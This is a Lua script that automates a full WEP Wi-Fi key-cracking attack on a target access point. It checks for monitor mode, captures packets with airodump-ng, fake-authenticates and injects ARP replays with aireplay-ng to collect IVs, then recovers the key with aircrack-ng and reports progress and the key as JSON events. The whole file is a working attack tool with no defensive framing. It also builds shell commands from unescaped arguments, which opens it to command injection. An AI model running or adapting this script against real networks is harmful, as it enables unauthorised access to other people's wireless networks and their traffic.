local iface, bssid, channel, capfile = arg[1], arg[2], arg[3] or "1", arg[4] or "/tmp/wep_capture"

local function je(s) return '"'..tostring(s):gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n'):gsub('\r','\\r')..'"' end
local function tel(e,d)
  io.write('{"event":'..je(e)..',"iface":'..je(iface)..',"bssid":'..je(bssid)..',"ssid":"","channel":'..je(channel)..',"data":'..d..',"timestamp":'..je(tostring(os.time()))..'}\n')
  io.flush()
end

local function mon()
  local f=io.popen("iw dev "..iface.." info 2>/dev/null"); if not f then return false end
  local o=f:read("*a"); f:close()
  if o:find("type monitor") then tel("monitor_ok",'{"msg":"OK"}') return true end
  tel("monitor_fail",'{"msg":"no monitor"}') return false
end

local function scan_client()
  tel("scan","{}")
  os.execute("airodump-ng "..iface.." --bssid "..bssid.." -c "..channel.." -w /tmp/wc 2>/dev/null &")
  os.execute("sleep 8"); os.execute("pkill -f 'airodump-ng "..iface.."' 2>/dev/null"); os.execute("sleep 1")
  local f=io.open("/tmp/wc-01.csv","r"); if not f then return nil end
  local mac, in_sta = nil, false
  for l in f:lines() do
    if l:find("Station MAC") then in_sta=true
    elseif in_sta then
      local m=l:match("([%x:]+)")
      if m and m~=bssid then mac=m; tel("client",'{"mac":'..je(mac)..'}') break end
    end
  end
  f:close() return mac
end

local function cap_start()
  tel("cap_start",'{"file":'..je(capfile)..'}')
  local f=io.popen("airodump-ng "..iface.." --bssid "..bssid.." -c "..channel.." -w "..capfile.." 2>/dev/null &")
  if not f then tel("cap_fail",'{"err":"fail"}') return false end
  f:close() return true
end

local function arp_replay(client)
  local cmd="aireplay-ng -3 -b "..bssid
  if client then cmd=cmd.." -h "..client end
  cmd=cmd.." "..iface.." 2>/dev/null"
  tel("arp_start",'{"cmd":'..je(cmd)..'}')
  local f=io.popen(cmd); if not f then return false end
  local pkts=0
  while true do local l=f:read("*l"); if not l then break end
    if l:find("ARP") or l:find("packet") then pkts=pkts+1
      if pkts%100==0 then tel("arp_progress",'{"pkts":'..tostring(pkts)..'}') end
    end
  end f:close() tel("arp_done",'{"pkts":'..tostring(pkts)..'}') return pkts>0
end

local function fake_auth()
  local cmd="aireplay-ng -1 6000 -o 1 -q 10 -b "..bssid.." "..iface.." 2>/dev/null"
  local f=io.popen(cmd)
  if f then local o=f:read("*a"); f:close()
    if o:find("Association") or o:find("success") then tel("fake_auth_ok",'{}') return true end
  end
  tel("fake_auth_fail",'{}') return false
end

local function iv_count()
  local f=io.open(capfile.."-01.csv","r"); if not f then return 0 end
  local c=f:read("*a"); f:close()
  local iv=c:match("#IV%s+(%d+)")
  if iv then return tonumber(iv) end
  if c:match("#BSSID") then
    local dp=c:match("[%x:]+,[%d]+,[%d]+,[%d]+,[%d]+,[%d]+,[%d]+,[%d]+,[%d]+,[%d]+,[%d]+,[%d]+")
    if dp then return tonumber(dp:match(",([%d]+)$") or 0) end
  end
  return 0
end

local function crack()
  tel("crack_start",'{}')
  local f=io.popen("aircrack-ng "..capfile.."-01.cap 2>/dev/null"); if not f then return nil end
  local o=f:read("*a"); f:close()
  local key=o:match("KEY%[%d+:%d+%]%s*=%s*'([^']+)'")
  if not key then key=o:match("KEY FOUND!%s*%[%s*([^%]]+)%]") end
  if key then tel("key_found",'{"key":'..je(key)..'}') end
  return key
end

if not iface or not bssid then tel("error",'{"err":"Usage: wep_attack.lua <iface> <bssid> [chan] [capfile]"}') os.exit(1) end
if not mon() then tel("error",'{"err":"monitor required"}') os.exit(1) end

os.execute("iw dev "..iface.." set channel "..channel.." 2>/dev/null; iwconfig "..iface.." channel "..channel.." 2>/dev/null")

local client=scan_client()
if not client then tel("no_client",'{"msg":"no assoc client"}') end
if not cap_start() then tel("error",'{"err":"cap fail"}') os.exit(1) end
os.execute("sleep 3"); fake_auth(); os.execute("sleep 2")
tel("collect_start",'{}')

local target, waited = 20000, 0
while waited<300 do
  local iv=iv_count(); tel("iv",'{"ivs":'..tostring(iv)..',"target":'..tostring(target)..'}')
  if iv>=target then tel("target_reached",'{"ivs":'..tostring(iv)..'}') break end
  arp_replay(client); os.execute("sleep 5"); waited=waited+5
end

os.execute("pkill -f 'airodump-ng "..iface.."' 2>/dev/null; pkill -f 'aireplay-ng -3' 2>/dev/null; sleep 2")
local key=crack()
if key then tel("complete",'{"status":"success","wep_key":'..je(key)..'}') else tel("complete",'{"status":"failed"}') end
